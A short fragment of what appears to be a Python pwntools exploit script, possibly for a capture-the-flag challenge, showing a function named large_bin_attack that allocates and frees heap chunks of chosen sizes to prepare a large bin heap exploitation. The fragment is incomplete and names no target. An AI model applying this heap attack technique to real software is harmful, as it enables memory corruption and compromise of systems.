...
def large_bin_attack():
    ...
    io.sendline("1")
    malloc_chunk("1","0x428")  # chunk size 0x430
    malloc_chunk("9","0x498")  # chunk size 0x4a0
    malloc_chunk("10","0x499") # chunk size 0x4b0
    malloc_chunk("2","0x418")  # chunk size 0x420
    malloc_chunk("8","0x488")
    free_chunk("1")
    #gdb.attach(io)
